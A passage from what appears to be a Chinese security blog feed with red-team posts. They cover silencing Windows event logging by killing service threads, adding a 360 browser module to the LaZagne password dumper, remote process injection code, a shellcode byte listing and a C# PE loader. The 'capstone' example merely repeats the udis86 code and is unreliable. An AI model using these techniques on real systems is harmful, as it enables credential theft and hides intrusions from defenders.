AS</h2><p><strong>打开apktool 解包生成的目录</strong></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172920337.png" srcset="/cray/img/loading.gif" alt="image-20200330175318198"></p><p>打开后在AS目录如下 </p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330175900669.png" srcset="/cray/img/loading.gif" alt="image-20200330175900669"></p><p>接下来每一步都要做</p><ol><li><p>设置源根目录</p><p>右键Smali，选择make Drectory As -&gt; sourses root </p><p>有多少个Smali文件夹就设置多少</p><p>但是也有将整个项目都设为Soourses root（未尝试）</p></li><li><p>设置SDK</p><p>右键项目，open modlue setting 然后选择Project 选择一个本机的SDK</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330180417381.png" srcset="/cray/img/loading.gif" alt="image-20200330180417381"></p></li><li><p>配置调试器选项</p><p>基本配置都好了，配置下调试选项就行</p><p>选择 Run –&gt;Edit Configurations，增加一个Remote调试的调试选项</p><p>注意红色表注的就行，其他默认</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181702261.png" srcset="/cray/img/loading.gif" alt="image-20200330180811567"></p></li></ol><h3 id="连接模拟器调试"><a href="#连接模拟器调试" class="headerlink" title="连接模拟器调试"></a>连接模拟器调试</h3><p>打开cmd</p><p>查询模拟器中所有的进程</p><p><code>adb shell ps</code></p><p>找到packName的PID</p><p>这里的PID 是<code>3336</code></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330180811567.png" srcset="/cray/img/loading.gif" alt="image-20200330181315755"></p><p>最后做一个端口转发</p><p><code>adb forward tcp:5005 jdwp:3336</code></p><p>回到AS中，在入口处下个断点</p><p>然后调试，成功如下图</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181315755.png" srcset="/cray/img/loading.gif" alt="image-20200330181702261"></p><p>ohhhhhhh :star:</p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Google Driver 整合篇</title>
    <link href="/cray/2020/03/28/Google%20Driver%E6%95%B4%E5%90%88%E7%AF%87/"/>
    <url>/cray/2020/03/28/Google%20Driver%E6%95%B4%E5%90%88%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>1.拥有一个Google Gmail账号</p><p>2.有梯子</p><h2 id="加入团队盘"><a href="#加入团队盘" class="headerlink" title="加入团队盘"></a>加入团队盘</h2><p>Google Driver的本身容量很小，使用团队盘就可以无限大小</p><p>这些团队盘大多都是各个大学背景申请的，具体操作未知</p><p>申请地址（如果失效，自行Google【Google Team Drive 申请】）</p><p><a href="https://td.fastio.me/" target="_blank" rel="noopener">https://td.fastio.me/</a> </p><p><strong>Name 随意填写</strong></p><p><strong>邮箱就填你要的Gmail邮箱</strong></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328103456093.png" srcset="/cray/img/loading.gif" alt="image-20200328103456093"></p><p>回到自己的Google Driver中，看到有共享云硬盘则为成功，否则多尝试加入几个Driver Team</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328103655483.png" srcset="/cray/img/loading.gif" alt="image-20200328103655483"></p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>资源一般都是在TG电报群中找，很多资源，这些看自己技术了</p><p><a href="https://t.me/dianying4k" target="_blank" rel="noopener">https://t.me/dianying4k</a></p><p><a href="http://www.sssoou.com" target="_blank" rel="noopener">http://www.sssoou.com</a></p><h2 id="如何加速下载"><a href="#如何加速下载" class="headerlink" title="如何加速下载"></a>如何加速下载</h2><p>这个加速加载只能下载你自己的网盘里面的东西</p><h3 id="GoIndex-代码生成"><a href="#GoIndex-代码生成" class="headerlink" title="GoIndex 代码生成"></a>GoIndex 代码生成</h3><p>访问 <a href="https://install.gd.workers.dev/" target="_blank" rel="noopener">https://install.gd.workers.dev/</a></p><ol><li><p>获取认证码，都是点点点，复制粘贴</p></li><li><p>目录可以默认</p></li><li><p>密码可以自己设置，但是要记住</p></li><li><p>点击生成代码，这个代码要部署到cloudflare中</p></li><li><p>这个时候点击 <a href="https://dash.cloudflare.com/" target="_blank" rel="noopener">https://dash.cloudflare.com/</a></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110246292.png" srcset="/cray/img/loading.gif" alt></p></li><li><p>自行注册，账号没有要求。登录后点击如下地址</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110413035.png" srcset="/cray/img/loading.gif" alt="image-20200328110413035"></p></li><li><p>创建新的，贴上之前生成的js代码，然后修改root如下，然后保存部署</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110948928.png" srcset="/cray/img/loading.gif" alt></p></li><li><p>访问右侧的链接，会叫填入密码，密码就是第3步设置的</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328111301819.png" srcset="/cray/img/loading.gif" alt="image-20200328111301819"></p></li><li><p>复制它的链接，打开下载工具，迅雷，IDM，Motrix等都可以</p><p>我这里用Motrix测试，家里带宽50M</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328113104155.png" srcset="/cray/img/loading.gif" alt="image-20200328113104155"></p><p>去测一下<a href="https://www.speedtest.cn/下载带宽，基本就等于这里的下载速度了。" target="_blank" rel="noopener">https://www.speedtest.cn/下载带宽，基本就等于这里的下载速度了。</a></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328112645982.png" srcset="/cray/img/loading.gif" alt="image-20200328112645982"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>下载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于C#的PEloder</title>
    <link href="/cray/2020/03/25/%E5%9F%BA%E4%BA%8EC#%E7%9A%84PEloder/"/>
    <url>/cray/2020/03/25/%E5%9F%BA%E4%BA%8EC#%E7%9A%84PEloder/</url>
    
    <content type="html"><![CDATA[<p>使用C#的pe加载器可以很方便的生成和修改，代码可变性较高，可在被目标机中编译生成</p><p>思路来源：Casey Smith，GhostPack  和 3student</p><h3 id="C-PE加载"><a href="#C-PE加载" class="headerlink" title="C#PE加载"></a>C#PE加载</h3><p>Casey Smith提供的方案有两种加载方式</p><p>1.<code>public PELoader(string filePath)</code></p><p>2.<code>public PELoader(byte[] fileBytes)</code></p><p>方法1 可以直接加载运行一个本地的可执行程序</p><p>方法2 则是可以直接执行内存中的可运行程序的流数据</p><p>代码见：</p><p><a href="https://gitee.com/L0yy/Cshap/blob/master/PEloader.cs" target="_blank" rel="noopener">https://gitee.com/L0yy/Cshap/blob/master/PEloader.cs</a></p><h3 id="改良"><a href="#改良" class="headerlink" title="改良"></a>改良</h3><p>经过测试，上述代码只能加载64位的PE。</p><p>通过3student的改良，将64位版本中的Opheader结构修改位32位的</p><p>拷贝一份学习</p><p><a href="https://gitee.com/L0yy/Cshap/blob/master/SharpPELoaderGenerater.cs" target="_blank" rel="noopener">https://gitee.com/L0yy/Cshap/blob/master/SharpPELoaderGenerater.cs</a></p><p>其他代码整合见</p><p><a href="https://gitee.com/L0yy/Cshap" target="_blank" rel="noopener">https://gitee.com/L0yy/Cshap</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>C#</tag>
      
      <tag>RedTeam</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Window事件日志清理</title>
    <link href="/cray/2020/03/18/windows%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97/"/>
    <url>/cray/2020/03/18/windows%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97/</url>
    
    <content type="html"><![CDATA[<h3 id="Window事件日志"><a href="#Window事件日志" class="headerlink" title="Window事件日志"></a>Window事件日志</h3><blockquote><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p></blockquote><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>1.遍历进程模块，筛选svchost</p><p>2.遍历进程导入模块，是否有wevtsvc.dll模块，如果有，则进程为目标进程</p><p>3.再次遍历进程的所有线程，获取每个线程句柄</p><p>使用未导出函数<code>NtQueryInformationThread</code>获取线程的THREAD_BASIC_INFORMATION结构体信息，读取这个进程的数据ProcessTag，根据这个Tag来找到SC_SERVICE_TAG_QUERY.pBuffer，当这个为eventlog则是日志监控进程</p><p>测试效果如下：</p><p>将特定线程结束就可以停止记录了。</p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/1.gif" srcset="/cray/img/loading.gif" alt="1" style="zoom:50%;"><p>代码参考：<a href="https://github.com/QAX-A-Team/EventCleaner" target="_blank" rel="noopener">https://github.com/QAX-A-Team/EventCleaner</a></p><h3 id="NtQueryInformationThread"><a href="#NtQueryInformationThread" class="headerlink" title="NtQueryInformationThread"></a>NtQueryInformationThread</h3><p>获取到线程信息，这里主要是拿到线程的Tag，线程Tag从线程TEB中拿出</p><p>x86 PPEB + 0xF60</p><p>x64 PPEB + 0x1720 </p><p>参考<a href="http://terminus.rewolf.pl/terminus/structures/ntdll/_TEB_x64.html" target="_blank" rel="noopener">http://terminus.rewolf.pl/terminus/structures/ntdll/_TEB_x64.html</a></p><h3 id="IQueryTagInformation"><a href="#IQueryTagInformation" class="headerlink" title="IQueryTagInformation"></a><em>I</em>QueryTagInformation</h3><p>这里根据tag来获取线程属性，也就是</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200315155137730.png" srcset="/cray/img/loading.gif" alt="image-20200315155137730"></p><p><strong>我修改后的代码</strong></p><p><a href="https://gitee.com/L0yy/log_cleaning" target="_blank" rel="noopener">https://gitee.com/L0yy/log_cleaning</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ReadTeam</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>udis86和capstone基本使用</title>
    <link href="/cray/2020/03/18/udis86%E5%92%8Ccapstone%E4%BD%BF%E7%94%A8%E4%BE%8B%E5%AD%90/"/>
    <url>/cray/2020/03/18/udis86%E5%92%8Ccapstone%E4%BD%BF%E7%94%A8%E4%BE%8B%E5%AD%90/</url>
    
    <content type="html"><![CDATA[<h3 id="udis86"><a href="#udis86" class="headerlink" title="udis86"></a>udis86</h3><p>第一次使用很麻烦，（自己太菜</p><p>lib库要自己去生成，源文件缺少头文件，未解决。使用加号生成的lib库</p><p>要导入</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200310173936136.png" srcset="/cray/img/loading.gif" alt="image-20200310173936136"></p><p>需要手动导入头文件<code>udis86.h</code></p><p>lib库文件<code>libudis86.lib</code> </p><p>测试代码如下</p><pre><code class="c++">#include &lt;stdio.h&gt;#include &lt;udis86.h&gt;#include &lt;windows.h&gt;#pragma comment(lib, &quot;libudis86.lib&quot;) struct FileInfo{    LPVOID pAsmCode;    int AsmLen;};FileInfo LoadFileToMem(const char* FilePath){    FileInfo sAsm;    FILE* fp;    fopen_s(&amp;fp, FilePath, &quot;rb&quot;);    fseek(fp, 0, SEEK_END);    sAsm.AsmLen = ftell(fp);    fseek(fp, 0, SEEK_SET);    sAsm.pAsmCode = new char[sAsm.AsmLen+1];    ZeroMemory(sAsm.pAsmCode, sAsm.AsmLen);    fread_s(sAsm.pAsmCode, sAsm.AsmLen, 1, sAsm.AsmLen, fp);    fclose(fp);    return sAsm;}int main(){    FileInfo sAsm = LoadFileToMem(&quot;C:\\Users\\Cray\\Desktop\\dEMO\\Shellcode_64.bin&quot;);    ud_t ud_obj;    ud_init(&amp;ud_obj);    //ud_set_input_file(&amp;ud_obj, stdin);    //从数据流中读入二进制数据    ud_set_input_buffer(&amp;ud_obj, (PBYTE)sAsm.pAsmCode, sAsm.AsmLen);    //内存中读入    ud_set_mode(&amp;ud_obj, 64);    //输出32位汇编    ud_set_syntax(&amp;ud_obj, UD_SYN_INTEL); //INTEL 汇编语法    while (ud_disassemble(&amp;ud_obj)) {        printf(&quot;\t%s\n&quot;, ud_insn_asm(&amp;ud_obj));    }    delete[] sAsm.pAsmCode;    return 0;}</code></pre><p><strong>disasm.exe 生成的二进制格式，用来加载shellcode也是相当好用的</strong></p><pre><code class="shell">D:\encodeDecodeOops\udis&gt;disasm.exe  -b 32 -f c Shellcode_32.bin#define SHELLCODE_32_SIZE 307char SHELLCODE_32[] = {  /* 0000 */ &quot;\x31\xc9&quot;                     /* xor ecx, ecx                    */  /* 0002 */ &quot;\x64\x8b\x41\x30&quot;             /* mov eax, [fs:ecx+0x30]          */  /* 0006 */ &quot;\x8b\x40\x0c&quot;                 /* mov eax, [eax+0xc]              */  /* 0009 */ &quot;\x8b\x70\x14&quot;                 /* mov esi, [eax+0x14]             */  /* 000C */ &quot;\xad&quot;                         /* lodsd                           */  /* 000D */ &quot;\x96&quot;                         /* xchg esi, eax                   */  /* 000E */ &quot;\xad&quot;                         /* lodsd                           */  /* 000F */ &quot;\x8b\x58\x10&quot;                 /* mov ebx, [eax+0x10]             */  /* 0012 */ &quot;\x8b\x53\x3c&quot;                 /* mov edx, [ebx+0x3c]             */  /* 0015 */ &quot;\x01\xda&quot;                     /* add edx, ebx                    */  /* 0017 */ &quot;\x8b\x52\x78&quot;                 /* mov edx, [edx+0x78]             */  /* 001A */ &quot;\x01\xda&quot;                     /* add edx, ebx                    */  /* 001C */ &quot;\x8b\x72\x20&quot;                 /* mov esi, [edx+0x20]             */  /* 001F */ &quot;\x01\xde&quot;                     /* add esi, ebx                    */  /* 0021 */ &quot;\x31\xc9&quot;                     /* xor ecx, ecx                    */  /* 0023 */ &quot;\x41&quot;                         /* inc ecx                         */  /* 0024 */ &quot;\xad&quot;                         /* lodsd                           */  /* 0025 */ &quot;\x01\xd8&quot;                     /* add eax, ebx                    */  /* 0027 */ &quot;\x81\x38\x47\x65\x74\x50&quot;     /* cmp dword [eax], 0x50746547     */  /* 002D */ &quot;\x75\xf4&quot;                     /* jnz 0x23                        */  /* 002F */ &quot;\x81\x78\x04\x72\x6f\x63\x41&quot; /* cmp dword [eax+0x4], 0x41636f72 */  /* 0036 */ &quot;\x75\xeb&quot;                     /* jnz 0x23                        */  /* 0038 */ &quot;\x81\x78\x08\x64\x64\x72\x65&quot; /* cmp dword [eax+0x8], 0x65726464 */  /* 003F */ &quot;\x75\xe2&quot;                     /* jnz 0x23                        */  /* 0041 */ &quot;\x8b\x72\x24&quot;                 /* mov esi, [edx+0x24]             */  /* 0044 */ &quot;\x01\xde&quot;                     /* add esi, ebx                    */  /* 0046 */ &quot;\x66\x8b\x0c\x4e&quot;             /* mov cx, [esi+ecx*2]             */      ...</code></pre><h3 id="capstone"><a href="#capstone" class="headerlink" title="capstone"></a>capstone</h3><p>也是需要自己导入lib库</p><p>例子如下，网上也有教程</p><pre><code class="c++">#include &lt;stdio.h&gt;#include &lt;udis86.h&gt;#include &lt;windows.h&gt;#pragma comment(lib, &quot;libudis86.lib&quot;) struct FileInfo{    LPVOID pAsmCode;    int AsmLen;};FileInfo LoadFileToMem(const char* FilePath){    FileInfo sAsm;    FILE* fp;    fopen_s(&amp;fp, FilePath, &quot;rb&quot;);    fseek(fp, 0, SEEK_END);    sAsm.AsmLen = ftell(fp);    fseek(fp, 0, SEEK_SET);    sAsm.pAsmCode = new char[sAsm.AsmLen+1];    ZeroMemory(sAsm.pAsmCode, sAsm.AsmLen);    fread_s(sAsm.pAsmCode, sAsm.AsmLen, 1, sAsm.AsmLen, fp);    fclose(fp);    return sAsm;}int main(){    FileInfo sAsm = LoadFileToMem(&quot;C:\\Users\\Cray\\Desktop\\dEMO\\Shellcode_64.bin&quot;);    ud_t ud_obj;    ud_init(&amp;ud_obj);    //ud_set_input_file(&amp;ud_obj, stdin);    //从数据流中读入二进制数据    ud_set_input_buffer(&amp;ud_obj, (PBYTE)sAsm.pAsmCode, sAsm.AsmLen);    //内存中读入    ud_set_mode(&amp;ud_obj, 64);    //输出32位汇编    ud_set_syntax(&amp;ud_obj, UD_SYN_INTEL); //INTEL 汇编语法    while (ud_disassemble(&amp;ud_obj)) {        printf(&quot;\t%s\n&quot;, ud_insn_asm(&amp;ud_obj));    }    delete[] sAsm.pAsmCode;    return 0;}</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lazagne导出密码</title>
    <link href="/cray/2020/03/18/LaZagne%E5%AF%BC%E5%87%BA%E5%AF%86%E7%A0%81/"/>
    <url>/cray/2020/03/18/LaZagne%E5%AF%BC%E5%87%BA%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>LaZagne project 是一款用于检索大量存储在本地计算机上密码的开源应用程序。每款软件他们保存密码的方法或许不尽相同（明文，API，算法，数据库等等），开发这款工具的目的是为了寻找计算机中最常用软件的密码</strong></p><h3 id="工具源码介绍"><a href="#工具源码介绍" class="headerlink" title="工具源码介绍"></a>工具源码介绍</h3><p>项目来源 <a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><p>增加了<strong>360浏览器</strong>的模块</p><p>目前已经支持提取密码的软件列表</p><table><thead><tr><th align="center"></th><th align="left">Windows</th><th>Linux</th><th>Mac</th></tr></thead><tbody><tr><td align="center">Browsers</td><td align="left">7Star<br> Amigo<br> BlackHawk<br> Brave<br> Centbrowser<br> Chedot<br> Chrome Canary<br> Chromium<br> Coccoc<br> Comodo Dragon<br> Comodo IceDragon<br> Cyberfox<br> Elements Browser<br> Epic Privacy Browser<br> Firefox<br> Google Chrome<br> Icecat<br> K-Meleon<br> Kometa<br> Opera<br> Orbitum<br> Sputnik<br> Torch<br> Uran<br> Vivaldi<br> 360Chrom<br></td><td>Chrome<br> Firefox<br> Opera</td><td>Chrome<br> Firefox</td></tr><tr><td align="center">Chats</td><td align="left">Pidgin<br> Psi<br> Skype</td><td>Pidgin<br> Psi</td><td></td></tr><tr><td align="center">Databases</td><td align="left">DBVisualizer<br> Postgresql<br> Robomongo<br> Squirrel<br> SQLdevelopper</td><td>DBVisualizer<br> Squirrel<br> SQLdevelopper</td><td></td></tr><tr><td align="center">Games</td><td align="left">GalconFusion<br> Kalypsomedia<br> RogueTale<br> Turba</td><td></td><td></td></tr><tr><td align="center">Git</td><td align="left">Git for Windows</td><td></td><td></td></tr><tr><td align="center">Mails</td><td align="left">Outlook<br> Thunderbird</td><td>Clawsmail<br> Thunderbird</td><td></td></tr><tr><td align="center">Maven</td><td align="left">Maven Apache<br></td><td></td><td></td></tr><tr><td align="center">Dumps from memory</td><td align="left">Keepass<br> Mimikatz method</td><td>System Password</td><td></td></tr><tr><td align="center">Multimedia</td><td align="left">EyeCON<br></td><td></td><td></td></tr><tr><td align="center">PHP</td><td align="left">Composer<br></td><td></td><td></td></tr><tr><td align="center">SVN</td><td align="left">Tortoise</td><td></td><td></td></tr><tr><td align="center">Sysadmin</td><td align="left">Apache Directory Studio<br> CoreFTP<br> CyberDuck<br> FileZilla<br> FileZilla Server<br> FTPNavigator<br> OpenSSH<br> OpenVPN<br> KeePass Configuration Files (KeePass1, KeePass2)<br> PuttyCM<br>RDPManager<br> VNC<br> WinSCP<br> Windows Subsystem for Linux</td><td>Apache Directory Studio<br> AWS<br>  Docker<br> Environnement variable<br> FileZilla<br> gFTP<br> History files<br> Shares <br> SSH private keys <br> KeePass Configuration Files (KeePassX, KeePass2) <br> Grub</td><td></td></tr><tr><td align="center">Wifi</td><td align="left">Wireless Network</td><td>Network Manager<br> WPA Supplicant</td><td></td></tr><tr><td align="center">Internal mechanism passwords storage</td><td align="left">Autologon<br> MSCache<br> Credential Files<br> Credman <br> DPAPI Hash <br> Hashdump (LM/NT)<br> LSA secret<br> Vault Files</td><td>GNOME Keyring<br> Kwallet<br> Hashdump</td><td>Keychains<br> Hashdump</td></tr></tbody></table><h3 id="获取浏览器原理"><a href="#获取浏览器原理" class="headerlink" title="获取浏览器原理"></a>获取浏览器原理</h3><p>浏览器在用户输入密码登录某个网站后，会有提示询问你是否保存密码，方便下次登录</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317133729443.png" srcset="/cray/img/loading.gif" alt="image-20200317133729443"></p><p>这也存在安全问题，如果有人获得了执行shell的权限，读取浏览器中密码文件，完全可以通过撞库拿到更多的密码。</p><p>下面就360浏览器介绍怎么提取密码 </p><p>密码存储目录：</p><p><code>%LOCALAPPDATA%\360Chrome\Chrome\User Data\Default\Login Data</code></p><p>浏览器中使用数据库的方式保存账号，密码和对应的网站</p><p>通过sql管理工具打开，这里使用SQLiteStudio打开</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317135718468.png" srcset="/cray/img/loading.gif" alt="image-20200317135718468"></p><p>在WIndows上</p><p>​    浏览器借助Windows内置的<code>CryptProtectData</code>函数对密码进行加密。现在，虽然这是使用三重DES算法并创建特定于用户的密钥来加密数据，但是只要您登录到与加密该数据的用户相同的帐户，就可以将其解密。功能有一个对应的API，与之相反。<code>CryptUnprotectData</code>，它解密数据。显然，这在尝试解密存储的密码时将非常有用。</p><blockquote><h4 id="Mac-Linux-Implementation"><a href="#Mac-Linux-Implementation" class="headerlink" title="Mac/Linux Implementation"></a>Mac/Linux Implementation</h4><p>Encryption Scheme: AES-128 CBC with a constant salt and constant iterations. The decryption key is a PBKDF2 key generated with the following:</p><ul><li>salt is b’saltysalt’</li><li>key length is 16</li><li>iv is 16 bytes of space b’ ‘ * 16</li><li>on Mac OSX:<ul><li>password is in keychain under Chrome Safe Storage<ul><li>I use the excellent keyring package to get the password</li><li>You could also use bash: security find-generic-password -w -s “Chrome Safe Storage”</li></ul></li><li>number of iterations is 1003</li></ul></li><li>on Linux:<ul><li>password is peanuts</li><li>number of iterations is 1</li></ul></li></ul></blockquote><p>接下来使用调用<code>CryptUnprotectData</code>进行解密就行了，网上代码也很多</p><p><strong>360浏览器和Google chrom保存密码的方式是一样的</strong></p><p>比如，python提取chrom密码</p><p><a href="https://github.com/priyankchheda/chrome_password_grabber/blob/master/chrome.py" target="_blank" rel="noopener">https://github.com/priyankchheda/chrome_password_grabber/blob/master/chrome.py</a></p><h3 id="使用开发"><a href="#使用开发" class="headerlink" title="使用开发"></a>使用开发</h3><p>该工程使用纯py编写，流程很容易看懂，看到现在还没支持360浏览器，但是用户数也挺多的，所以尝试增加以下这个模块。</p><p><strong>使用前请认真阅读ReadMe</strong></p><p>安装必要的库，我这里环境是<strong>Python 2.7.13</strong></p><p><code>pip install -r requirements.txt</code></p><p>下面的每个文件夹都是不同软件的相关模块</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317180124260.png" srcset="/cray/img/loading.gif" alt="image-20200317180124260"></p><p>要修改浏览器模块的数据，就要修改相应模块</p><p>因为有很多浏览器保存密码的方式都是形同的，这里作者分了4类 分别是<strong>chromium_based</strong> <strong>ie</strong>  <strong>mozilla</strong> <strong>ucbrowser</strong> </p><p>大多数浏览器都是<strong>chromium_based</strong>格式存储密码，360浏览器也是</p><p>所以只需要增加一项配置文件就行了</p><p><a href="https://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_based.py#L216" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_based.py#L216</a></p><p>在里面新加一句</p><p><code>(u&#39;360ces&#39;, u&#39;{LOCALAPPDATA}\\360Chrome\\Chrome\\User Data&#39;),</code></p><p>测试如下</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317181302873.png" srcset="/cray/img/loading.gif" alt="image-20200317181302873"></p><p>不同环境库肯定不同，这里将他打包发布</p><p>可以使用py2exe或pyinstaller</p><p>由于py2exe不支持python2.7了，所以这里使用pyinstaller安装</p><p><code>pip install pyinstaller</code></p><p>也很简单，单文件模式输出就行</p><p><code>pyinstaller -F  laZagne.py</code></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317182426210.png" srcset="/cray/img/loading.gif" alt="image-20200317182426210"></p><p>最后拷贝dist下的成品exe就行了，但是因为用了import *的方式，所以很多无关的代码也写入了程序，这里暂时不能减少体积，如果要改，需要将每个py文件导入的模块细化，改为from _ import XXX 的格式，调用方式也需要修改。</p>]]></content>
    
    
    
    <tags>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>32-&gt;64注入shellcode</title>
    <link href="/cray/2020/03/18/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%AF%B964%E4%BD%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0/"/>
    <url>/cray/2020/03/18/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%AF%B964%E4%BD%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="远进程注入"><a href="#远进程注入" class="headerlink" title="远进程注入"></a>远进程注入</h2><p><a href="https://www.cnblogs.com/uAreKongqi/p/6012353.html" target="_blank" rel="noopener">注入参考——必看</a></p><h3 id="32位-gt-32位"><a href="#32位-gt-32位" class="headerlink" title="32位-&gt;32位"></a>32位-&gt;32位</h3><p>核心思路如下</p><ul><li>根据进程ID打开进程，获得进程句柄</li><li>申请内存空间</li><li>写入数据</li><li>将内存改为可读可执行(可选)</li><li>创建线程</li><li>等待线程退出(可选)</li></ul><p><strong>使用到的API</strong></p><ul><li>OpenProcess</li><li>VirtualAllocEx</li><li>WriteProcessMemory</li><li>VirtualProtectEx</li><li>CreateRemoteThread</li><li>WaitForSingleObject</li></ul><p>注入模板网上都有。这里贴一下注入函数且带有参数的写法</p><pre><code class="c++">#pragma once  #include &lt;windows.h&gt;  #include &lt;TlHelp32.h&gt;  #include &quot;stdio.h&quot;typedef struct _RemoteParam {    char szMsg[12];    //MessageBox函数中显示的字符提示      DWORD dwMessageBox;//MessageBox函数的入口地址  } RemoteParam, * PRemoteParam;//定义MessageBox类型的函数指针  typedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);DWORD __stdcall threadProc(LPVOID lParam){    RemoteParam* pRP = (RemoteParam*)lParam;    PFN_MESSAGEBOX pfnMessageBox;    pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox;    pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0);    return 0;}bool enableDebugPriv(){    HANDLE hToken;    LUID sedebugnameValue;    TOKEN_PRIVILEGES tkp;    if (!OpenProcessToken(GetCurrentProcess(),        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) {        return false;    }    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) {        CloseHandle(hToken);        return false;    }    tkp.PrivilegeCount = 1;    tkp.Privileges[0].Luid = sedebugnameValue;    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) {        CloseHandle(hToken);        return false;    }    return true;}HANDLE GetProcessHandleByName(LPCWSTR lpszProcessName){    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 pe;    pe.dwSize = sizeof(PROCESSENTRY32);    if (!Process32First(hSnapshot, &amp;pe)) {        MessageBoxA(NULL,            &quot;The frist entry of the process list has not been copyied to the buffer&quot;,            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);        return 0;    }    while (Process32Next(hSnapshot, &amp;pe)) {        if (!lstrcmpW(lpszProcessName, pe.szExeFile)) {            return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);        }    }    return 0;}int _main(){    const DWORD dwThreadSize = 4096;    DWORD dwWriteBytes = 0;    enableDebugPriv();    HANDLE TargetProc = GetProcessHandleByName(L&quot;CheckVm.exe&quot;);    if (!TargetProc)    {        MessageBoxA(NULL,            &quot;Open target process failed !&quot;,            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);        return 0;    }    //在宿主进程中为线程体开辟一块存储区域      //在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型      //其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。      void* pRemoteThread = VirtualAllocEx(TargetProc, 0,        dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    if (!pRemoteThread) {        MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,            &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);        return 0;    }    //将线程体拷贝到宿主进程中      if (!WriteProcessMemory(TargetProc,        pRemoteThread, &amp;threadProc, dwThreadSize, 0)) {        MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);        return 0;    }    //定义线程参数结构体变量      RemoteParam remoteData;    ZeroMemory(&amp;remoteData, sizeof(RemoteParam));    //填充结构体变量中的成员      HINSTANCE hUser32 = LoadLibrary(L&quot;User32.dll&quot;);    